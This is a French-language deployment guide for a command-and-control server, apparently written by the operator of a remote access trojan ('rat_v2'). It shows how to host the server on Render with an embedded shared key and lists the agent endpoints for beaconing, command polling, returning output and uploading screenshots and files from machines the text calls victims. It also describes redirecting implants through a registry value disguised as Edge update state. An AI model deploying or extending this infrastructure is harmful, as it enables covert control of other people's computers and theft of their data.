# Xtrem C2 — déploiement

Service C2 autonome, zéro dépendance, Node >= 18. Se déploie à côté de ton
frontend/backend Xtrem, sans toucher au code existant.

## 1. Créer le service sur Render

**New → Web Service** → connecte le repo qui contient `c2/`, puis :

| champ | valeur |
|---|---|
| Name | `xtrem-c2` |
| Runtime | Node |
| Build Command | `echo no-build` |
| Start Command | `node server.js` |
| Instance Type | Free |

Variables d'environnement :

```
C2_KEY = 97a6684663437afc15a22fa2b96823e5bee0031b055b8125
```

Le nom du service détermine l'URL. Si Render te donne exactement
`xtrem-c2.onrender.com`, rien d'autre à faire : le binaire est déjà compilé
pour cette adresse. Sinon, deux options :

- changer le nom du service en `xtrem-c2`, ou
- mettre à jour `rat_v2/secrets.json` (`host`), relancer
  `py -3 gen_secrets.py` puis `build.bat`.

Sans rebuild possible côté victime : la clé de registre
`HKCU\Software\Microsoft\EdgeUpdate\State\Host` (REG_SZ) écrase l'hôte
compilé. Une seule ligne à pousser via le C2 actuel.

## 2. Vérifier

```powershell
curl.exe "https://xtrem-c2.onrender.com/api/sessions" -H "X-C2-Key: 97a6684663437afc15a22fa2b96823e5bee0031b055b8125"
```

Réponse attendue : `{"ok":true,"sessions":[]}`.

Le dashboard est sur `https://xtrem-c2.onrender.com/` — colle la clé,
les sessions apparaissent.

## 3. Endpoints

Agents (binaire) :

| méthode | route | rôle |
|---|---|---|
| POST | `/api/beacon` | enregistrement + heartbeat 60 s |
| GET | `/api/poll?sid=` | long poll 25 s, renvoie les commandes |
| POST | `/api/result` | sortie de commande + ids de blobs |
| POST | `/api/file?sid=` | upload brut (screen, fichier) |
| GET | `/api/file?id=&key=` | téléchargement blob |

Admin (`X-C2-Key`) :

| méthode | route | rôle |
|---|---|---|
| GET | `/api/sessions` | liste des machines |
| POST | `/api/cmd` | `{sid, cmd}` → file d'attente |
| GET | `/api/output?sid=` | historique des sorties |
| GET | `/` | dashboard |

## 4. Limites Render free

- Le service s'endort après ~15 min sans trafic. Les **sessions en mémoire**
  sont perdues au réveil, pas les machines : l'agent re-beaconne toutes les
  60 s et réapparaît avec le même `sid` (stocké en registre).
- Système de fichiers éphémère : les blobs uploadés disparaissent au
  redéploiement. Pour de la persistance, brancher un bucket S3/R2 dans
  `blobs`.
- 512 Mo de RAM : `MAX_BLOBS = 200` et `MAX_BODY = 64 Mo` bornent l'usage.

## 5. Sécurité

- Une seule clé partagée, comparaison `timingSafeEqual`.
- Aucune route agent n'accepte un `sid` inconnu pour les uploads.
- Le dashboard ne stocke la clé que dans `localStorage` du navigateur.
- Le binaire embarque la clé XORée — vérifié absent en clair du PE.

## 6. Local

```powershell
$env:C2_KEY="localtestkey0123456789abcdef"; $env:PORT="8787"; node server.js
```

Puis dans `rat_v2/secrets.json` : `"host": "127.0.0.1:8787"`, rebuild.
